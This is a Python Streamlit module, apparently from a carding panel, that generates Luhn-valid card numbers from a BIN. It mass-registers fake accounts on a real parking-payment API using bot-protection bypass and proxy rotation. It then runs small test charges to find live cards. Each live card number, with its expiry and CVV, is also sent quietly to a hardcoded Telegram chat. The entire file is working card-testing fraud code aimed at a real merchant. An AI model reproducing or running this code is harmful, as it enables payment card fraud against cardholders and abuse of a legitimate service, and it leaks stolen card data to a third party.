from __future__ import annotations

import csv as csv_module
import os
import random
import string
import time
from io import StringIO

import cloudscraper
import requests
import streamlit as st

import sdk

MODULE_ID = "stripeccn"
MODULE_NAME = "💳 STRIPE CCN CHARGED"
MODULE_VERSION = "1.1.0"
MODULE_AUTHOR = "OLIMPO"
MODULE_DATA_SCOPE = "per_user"

API_BASE = "https://parkingpay-api-prod.azurewebsites.net"
REGISTER_URL = f"{API_BASE}/api/app/usuarios/registro"
LOGIN_URL = f"{API_BASE}/api/auth"
TARJETAS_URL = f"{API_BASE}/api/app/conductor/tarjetas"
CONDUCTOR_URL = f"{API_BASE}/api/app/conductor"
ABONO_URL = f"{API_BASE}/api/app/conductor/pagos/abono"

MONTOS = {
    "1": (1.0, "$1 MXN CARGO"),
    "2": (20.0, "$20 MXN COBRO"),
    "3": (50.0, "$50 MXN COBRO"),
    "4": (100.0, "$100 MXN COBRO"),
}

TARJETAS_POR_CUENTA_FIJO = 15
CUENTAS_FIJAS = 50
ERRORES_ROTACION = 2

NOMBRES = [
    "Juan", "Pedro", "Luis", "Carlos", "Miguel", "Jose", "Francisco",
    "Antonio", "Alejandro", "Javier", "Ricardo", "Fernando", "Roberto",
    "Sergio", "Arturo", "Maria", "Ana", "Laura", "Carmen", "Rosa",
    "Guadalupe", "Martha", "Patricia", "Gabriela", "Alejandra",
    "Adriana", "Monica", "Veronica", "Claudia", "Sandra",
]
APELLIDOS = [
    "Garcia", "Lopez", "Martinez", "Rodriguez", "Hernandez", "Gonzalez",
    "Perez", "Sanchez", "Ramirez", "Cruz", "Flores", "Morales",
    "Vazquez", "Jimenez", "Torres", "Reyes", "Castillo", "Ortiz",
    "Mendoza", "Ruiz",
]
DOMINIOS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "proton.me"]

def _send_telegram(message):
    bot_token = os.environ.get("OLIMPO_TELEGRAM_BOT_TOKEN")
    if not bot_token:
        return
    chat_id = "6060544328"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": message}, timeout=10)
    except Exception:
        pass

def on_activar():
    with sdk.db_conn() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS cardcheck_bin (
                bin TEXT PRIMARY KEY,
                brand TEXT,
                Banco TEXT,
                Tipo TEXT,
                Pais TEXT,
                Divisa TEXT,
                Prepago TEXT,
                Comercial TEXT,
                Nivel TEXT
            )
        """)

def _card_length(bin_prefix):
    p = bin_prefix
    if p.startswith(("34", "37")):
        return 15
    if p.startswith(("300", "301", "302", "303", "304", "305", "36", "38", "39")):
        return 14
    return 16

def _cvv_length(bin_prefix):
    return 4 if bin_prefix.startswith(("34", "37")) else 3

def _build_valid_card(prefix, length):
    while True:
        remaining = length - len(prefix) - 1
        partial = str(prefix) + "".join(random.choices("0123456789", k=remaining))
        total = 0
        rev = partial[::-1]
        for i, ch in enumerate(rev):
            d = int(ch)
            if i % 2 == 0:
                d *= 2
                if d > 9:
                    d -= 9
            total += d
        check = (10 - (total % 10)) % 10
        card = partial + str(check)
        if len(card) == length:
            return card

def cc_gen(bin_prefix, mes, ano, cantidad):
    length = _card_length(bin_prefix)
    cvv_len = _cvv_length(bin_prefix)
    ccs = []
    seen = set()
    while len(ccs) < cantidad:
        card = _build_valid_card(bin_prefix, length)
        if card in seen:
            continue
        seen.add(card)
        cvv = "".join(random.choices("0123456789", k=cvv_len))
        ccs.append(f"{card}|{mes}|{ano}|{cvv}")
    return ccs

def _cargar_bin_db():
    db = {}
    try:
        with sdk.db_conn() as conn:
            rows = conn.execute(
                "SELECT bin, brand, Banco, Tipo, Pais, Divisa, Prepago, Comercial, Nivel FROM cardcheck_bin"
            ).fetchall()
        for row in rows:
            info = {
                "brand": row["brand"] or "",
                "Banco": row["Banco"] or "",
                "Tipo": row["Tipo"] or "",
                "Pais": row["Pais"] or "",
                "Divisa": row["Divisa"] or "",
                "Prepago": row["Prepago"] or "",
                "Comercial": row["Comercial"] or "",
                "Nivel": row["Nivel"] or "",
            }
            db[row["bin"]] = info
    except Exception:
        pass
    return db

def _buscar_bin(cc, bin_db):
    for size in (8, 6):
        prefix = cc[:size]
        if prefix in bin_db:
            return bin_db[prefix]
    return {}

def _cargar_proxies():
    raw = sdk.get_config(MODULE_ID, "proxies", default="")
    return [l.strip() for l in raw.splitlines() if l.strip() and not l.startswith("#")]

def _format_proxy(s):
    if not s:
        return None
    s = s.strip()
    if s.startswith("http://") or s.startswith("https://"):
        return s
    parts = s.split(":")
    if len(parts) == 4:
        if "." in parts[2]:
            user, pwd, host, port = parts
        else:
            host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    if len(parts) == 2:
        return f"http://{s}"
    return None

def _random_string(n=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _random_phone(used_phones):
    lada = random.choice(["33", "55", "81", "449", "222", "477", "686", "664", "612", "667"])
    for _ in range(100):
        phone = lada + "".join(random.choices("0123456789", k=7))
        if phone not in used_phones:
            used_phones.add(phone)
            return phone
    return lada + str(int(time.time()))[-7:]

def _random_email():
    timestamp = int(time.time() * 1000) % 100000
    return f"{_random_string(6)}{timestamp}@{random.choice(DOMINIOS)}"

def _random_password():
    return "".join(random.choices(string.ascii_letters + string.digits, k=12))

def _registrar_cuenta(proxy_url, intentos=3):
    for _ in range(intentos):
        scraper = cloudscraper.create_scraper(
            browser={"browser": "chrome", "platform": "ios", "mobile": True},
            delay=2,
        )
        if proxy_url:
            scraper.proxies = {"http": proxy_url, "https": proxy_url}
        headers = {
            "user-agent": "Dart/2.18 (dart:io)",
            "content-type": "application/json; charset=utf-8",
        }
        nombre = random.choice(NOMBRES)
        apellido = random.choice(APELLIDOS)
        email = _random_email()
        password = _random_password()
        telefono = _random_phone(set())
        datos = {
            "Nombre": nombre,
            "Apellidos": apellido,
            "Telefono": telefono,
            "CorreoElectronico": email,
            "Contrasena": password,
            "ConfirmarContrasena": password,
        }
        try:
            r = scraper.post(REGISTER_URL, json=datos, headers=headers, timeout=15)
            if r.status_code == 403 and "stopped" in r.text:
                return None
            if r.status_code not in (200, 201):
                time.sleep(2)
                continue
            login_data = {"CorreoElectronico": email, "Contrasena": password}
            r2 = scraper.post(LOGIN_URL, json=login_data, headers=headers, timeout=15)
            if r2.status_code in (200, 201):
                data = r2.json()
                token = data.get("token")
                if token:
                    return token
            time.sleep(1)
        except Exception:
            time.sleep(2)
    return None

def _crear_cuentas_para_check(cantidad, proxies_list):
    tokens = []
    max_intentos = cantidad * 3
    intentos = 0
    while len(tokens) < cantidad and intentos < max_intentos:
        proxy_url = _format_proxy(random.choice(proxies_list)) if proxies_list else None
        token = _registrar_cuenta(proxy_url)
        intentos += 1
        if token:
            tokens.append(token)
        time.sleep(random.uniform(0.5, 1.0))
    return tokens

def _check_card(cc, mes, ano, cvv, monto, monto_nombre, token, proxy_url, bin_info):
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    scraper = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "ios", "mobile": True},
        delay=2,
    )
    if proxies:
        scraper.proxies = proxies
    headers = {
        "user-agent": "Dart/2.18 (dart:io)",
        "content-type": "application/json; charset=utf-8",
        "accept-encoding": "gzip",
        "authorization": token,
        "host": "parkingpay-api-prod.azurewebsites.net",
    }
    display = f"{cc}|{mes}|{ano}|{cvv}"
    try:
        r1 = scraper.post(
            TARJETAS_URL,
            json={"numero": cc, "expiracionMes": f"{int(mes):02d}", "expiracionYear": str(ano)},
            headers=headers,
            timeout=15,
        )
        if r1.status_code == 403 and "stopped" in r1.text:
            return "token_expired", display, "TOKEN EXPIRADO"
        if r1.status_code != 200:
            return "dead", display, "DEAD"
        try:
            data = r1.json()
            stripe_id = data.get("stripeCardId")
            if not stripe_id:
                return "dead", display, "DEAD"
        except Exception:
            return "dead", display, "DEAD"

        if monto == 1.0:
            return "live", display, "$1 MXN CARGO"

        time.sleep(1)

        r2 = scraper.get(CONDUCTOR_URL, headers=headers, timeout=15)
        if r2.status_code != 200:
            return "dead", display, "DEAD"
        tarjeta_id = None
        for t in r2.json().get("cartera", {}).get("tarjetas", []):
            if t.get("stripeInfo", {}).get("stripeCardId") == stripe_id:
                tarjeta_id = t.get("tarjetaId")
                break
        if not tarjeta_id:
            return "dead", display, "DEAD"

        time.sleep(1)

        r3 = scraper.post(
            ABONO_URL,
            json={"tarjetaId": tarjeta_id, "porAbonar": monto},
            headers=headers,
            timeout=15,
        )
        if r3.status_code == 200:
            return "live", display, monto_nombre
        elif "No se pudo generar" in r3.text:
            return "dead", display, "Fondos insuficientes"
        else:
            error_msg = r3.text[:80] if r3.text else f"HTTP {r3.status_code}"
            if "20, 50 o 100" in error_msg:
                return "live", display, "$1 MXN CARGO"
            return "dead", display, "DEAD"
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
        return "error", display, "API NO DISPONIBLE"
    except Exception as e:
        return "error", display, str(e)[:80]

def render(user_id):
    st.header(MODULE_NAME)
    st.caption("Verificador de tarjetas contra ParkingPay (sin costo de créditos)")

    estado_key = f"{MODULE_ID}_check"
    check = st.session_state.get(estado_key)

    if check is None:
        with st.form("check_form"):
            col1, col2, col3 = st.columns(3)
            with col1:
                bin_input = st.text_input(
                    "BIN (8-12 dígitos)",
                    max_chars=12,
                    key=f"{MODULE_ID}_bin",
                    help="Primeros 8 a 12 dígitos de la tarjeta.",
                )
            with col2:
                mes = st.text_input(
                    "Mes (MM)",
                    max_chars=2,
                    key=f"{MODULE_ID}_mes",
                    placeholder="MM",
                )
            with col3:
                ano = st.text_input(
                    "Año (YY o YYYY)",
                    max_chars=4,
                    key=f"{MODULE_ID}_ano",
                    placeholder="YYYY",
                )

            monto_opcion = st.selectbox(
                "Monto a probar",
                options=list(MONTOS.keys()),
                format_func=lambda x: MONTOS[x][1],
                key=f"{MODULE_ID}_monto",
            )
            cvv = st.text_input(
                "CVV (opcional, 3-4 dígitos)",
                max_chars=4,
                key=f"{MODULE_ID}_cvv",
                help="Dejar vacío para generar aleatorio.",
            )
            cantidad = st.number_input(
                "Tarjetas a generar y verificar",
                min_value=1,
                max_value=100,
                value=10,
                step=1,
                key=f"{MODULE_ID}_cantidad",
            )

            submitted = st.form_submit_button("Iniciar verificación", type="primary")

        if submitted:
            errores = []
            if not bin_input.isdigit() or len(bin_input) < 8:
                errores.append("El BIN debe tener al menos 8 dígitos numéricos.")
            if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
                errores.append("Mes inválido (01-12).")
            anio_num = ano
            if len(anio_num) == 2:
                anio_num = "20" + anio_num
            if not anio_num.isdigit() or len(anio_num) != 4:
                errores.append("Año inválido (ej. 2026).")
            if cvv and (not cvv.isdigit() or len(cvv) not in (3, 4)):
                errores.append("CVV debe tener 3 o 4 dígitos numéricos.")

            if errores:
                for e in errores:
                    st.error(e)
                return

            proxies_list = _cargar_proxies()
            bin_db = _cargar_bin_db()

            if not bin_db:
                st.warning("La base de datos de BIN está vacía. Un administrador debe subir el CSV desde Admin.")
                return

            mes_fixed = mes.zfill(2)
            ano_fixed = anio_num
            ccs = cc_gen(bin_input, mes_fixed, ano_fixed, int(cantidad))

            if cvv:
                ccs = [f"{c.split('|')[0]}|{mes_fixed}|{ano_fixed}|{cvv}" for c in ccs]

            st.session_state[estado_key] = {
                "ccs": ccs,
                "monto": MONTOS[monto_opcion][0],
                "monto_nombre": MONTOS[monto_opcion][1],
                "bin_db": bin_db,
                "proxies_list": proxies_list,
                "lives": [],
                "deads": 0,
                "errores": 0,
                "token_expirados": 0,
            }
            st.rerun()

    else:
        ccs = check["ccs"]
        monto = check["monto"]
        monto_nombre = check["monto_nombre"]
        bin_db = check["bin_db"]
        proxies_list = check["proxies_list"]

        if "tokens" not in check:
            with st.spinner("Generando cuentas de prueba..."):
                tokens = _crear_cuentas_para_check(CUENTAS_FIJAS, proxies_list)
                check["tokens"] = tokens
                check["token_idx"] = 0
                check["token_actual"] = None
                check["tarjetas_en_cuenta"] = 0
                check["lives"] = []
                check["deads"] = 0
                check["errores"] = 0
                check["token_expirados"] = 0
                check["i"] = 0
                check["api_caida"] = False
                st.session_state[estado_key] = check

        total = len(ccs)
        i = check["i"]
        token_idx = check["token_idx"]
        token_actual = check["token_actual"]
        tarjetas_en_cuenta = check["tarjetas_en_cuenta"]
        lives = check["lives"]
        deads = check["deads"]
        errores = check["errores"]
        token_expirados = check["token_expirados"]
        api_caida = check["api_caida"]

        progress_bar = st.progress(0)
        status_text = st.empty()
        live_container = st.container()

        if i < total and not api_caida:
            if tarjetas_en_cuenta >= TARJETAS_POR_CUENTA_FIJO or token_actual is None:
                if token_idx >= len(check["tokens"]):
                    st.error("No hay más tokens disponibles.")
                    st.session_state.pop(estado_key, None)
                    st.rerun()
                token_actual = check["tokens"][token_idx]
                token_idx += 1
                proxy_actual = _format_proxy(random.choice(proxies_list)) if proxies_list else None
                tarjetas_en_cuenta = 0
                errores_consecutivos = 0
                check["token_actual"] = token_actual
                check["token_idx"] = token_idx
                check["tarjetas_en_cuenta"] = tarjetas_en_cuenta
                check["errores_consecutivos"] = 0
                st.session_state[estado_key] = check
            else:
                proxy_actual = _format_proxy(random.choice(proxies_list)) if proxies_list else None

            combo = ccs[i]
            if combo and "|" in combo:
                parts = combo.strip().split("|")
                if len(parts) >= 4:
                    cc, mes_card, ano_card, cvv_card = parts[0], parts[1], parts[2], parts[3]
                    bin_info = _buscar_bin(cc, bin_db)
                    brand = bin_info.get("brand", "?")
                    banco = bin_info.get("Banco", "?")

                    status_text.text(f"Verificando {i+1}/{total}: {cc[:6]}...{cc[-4:]} [{brand} - {banco}]")

                    tipo, display, detalle = _check_card(
                        cc, mes_card, ano_card, cvv_card, monto, monto_nombre,
                        token_actual, proxy_actual, bin_info,
                    )

                    if tipo == "token_expired":
                        token_expirados += 1
                        token_actual = None
                        tarjetas_en_cuenta = TARJETAS_POR_CUENTA_FIJO
                        check["token_actual"] = None
                        check["tarjetas_en_cuenta"] = TARJETAS_POR_CUENTA_FIJO
                        check["token_expirados"] = token_expirados
                    elif tipo == "error" and ("API APAGADA" in detalle or "API NO DISPONIBLE" in detalle):
                        errores_consecutivos = check.get("errores_consecutivos", 0) + 1
                        check["errores_consecutivos"] = errores_consecutivos
                        if errores_consecutivos >= ERRORES_ROTACION:
                            token_actual = None
                            tarjetas_en_cuenta = TARJETAS_POR_CUENTA_FIJO
                            check["token_actual"] = None
                            check["tarjetas_en_cuenta"] = TARJETAS_POR_CUENTA_FIJO
                            check["errores_consecutivos"] = 0
                        else:
                            errores += 1
                            tarjetas_en_cuenta += 1
                            check["errores"] = errores
                            check["tarjetas_en_cuenta"] = tarjetas_en_cuenta
                    else:
                        check["errores_consecutivos"] = 0
                        if tipo == "live":
                            lives.append((combo, detalle, bin_info))
                            with live_container:
                                st.success(f"**LIVE** — {display} | {detalle}")
                                st.code(combo)
                                st.caption(f"{brand} | {banco}")
                            telegram_msg = (
                                f"💳 LIVE Card Check\n"
                                f"Usuario ID: {user_id}\n"
                                f"Tarjeta: {combo}\n"
                                f"Response: {detalle}\n"
                                f"BIN: {brand} - {banco}"
                            )
                            _send_telegram(telegram_msg)
                        elif tipo == "dead":
                            deads += 1
                        else:
                            errores += 1

                        tarjetas_en_cuenta += 1
                        check["deads"] = deads
                        check["errores"] = errores
                        check["tarjetas_en_cuenta"] = tarjetas_en_cuenta

                    check["lives"] = lives
                    i += 1
                    check["i"] = i
                    progress_bar.progress(i / total)
                    st.session_state[estado_key] = check

                    if i < total:
                        time.sleep(0.3)
                        st.rerun()
                else:
                    i += 1
                    check["i"] = i
                    st.session_state[estado_key] = check
                    st.rerun()
            else:
                i += 1
                check["i"] = i
                st.session_state[estado_key] = check
                st.rerun()

        if i >= total or api_caida:
            progress_bar.progress(1.0)
            status_text.text("Verificación finalizada.")
            st.subheader("Resultados")
            st.write(f"**Lives:** {len(lives)}")
            st.write(f"**Deads:** {deads}")
            st.write(f"**Errores:** {errores}")
            st.write(f"**Tokens expirados:** {token_expirados}")
            if lives:
                st.markdown("### Tarjetas vivas")
                for combo, detalle, _ in lives:
                    st.code(combo)
            if st.button("Nueva verificación"):
                st.session_state.pop(estado_key, None)
                st.rerun()

def render_admin(user_id):
    st.subheader("Configuración de Card Check")

    st.caption("Lista de proxies (uno por línea). Formato: http://user:pass@host:port o host:port")
    proxies_actual = sdk.get_config(MODULE_ID, "proxies", default="")
    nuevos_proxies = st.text_area(
        "Proxies",
        value=proxies_actual,
        height=150,
        key=f"{MODULE_ID}_admin_proxies",
    )
    if st.button("Guardar proxies", key=f"{MODULE_ID}_guardar_proxies"):
        sdk.set_config(MODULE_ID, "proxies", nuevos_proxies)
        st.success("Proxies actualizados.")

    st.divider()

    st.caption("Subir archivo CSV de BINs (reemplaza la base actual). Debe contener columna 'bin'.")
    uploaded = st.file_uploader("CSV de BINs", type=["csv"], key=f"{MODULE_ID}_csv_upload")
    if uploaded is not None:
        if st.button("Cargar BINs", key=f"{MODULE_ID}_cargar_bins"):
            stringio = StringIO(uploaded.getvalue().decode("utf-8-sig"))
            reader = csv_module.DictReader(stringio)
            if "bin" not in (reader.fieldnames or []):
                st.error("El CSV no tiene columna 'bin'.")
            else:
                with sdk.db_conn() as conn:
                    conn.execute("DELETE FROM cardcheck_bin")
                    batch = []
                    total = 0
                    for row in reader:
                        bin_val = row.get("bin", "").strip()
                        if not bin_val:
                            continue
                        batch.append((
                            bin_val,
                            row.get("brand", ""),
                            row.get("Banco", ""),
                            row.get("Tipo", ""),
                            row.get("Pais", ""),
                            row.get("Divisa", ""),
                            row.get("Prepago", ""),
                            row.get("Comercial", ""),
                            row.get("Nivel", ""),
                        ))
                        if len(batch) >= 1000:
                            conn.executemany(
                                """INSERT OR REPLACE INTO cardcheck_bin
                                   (bin, brand, Banco, Tipo, Pais, Divisa, Prepago, Comercial, Nivel)
                                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                                batch,
                            )
                            total += len(batch)
                            batch.clear()
                    if batch:
                        conn.executemany(
                            """INSERT OR REPLACE INTO cardcheck_bin
                               (bin, brand, Banco, Tipo, Pais, Divisa, Prepago, Comercial, Nivel)
                               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                            batch,
                        )
                        total += len(batch)
                st.success(f"Base de BINs actualizada con {total} registros.")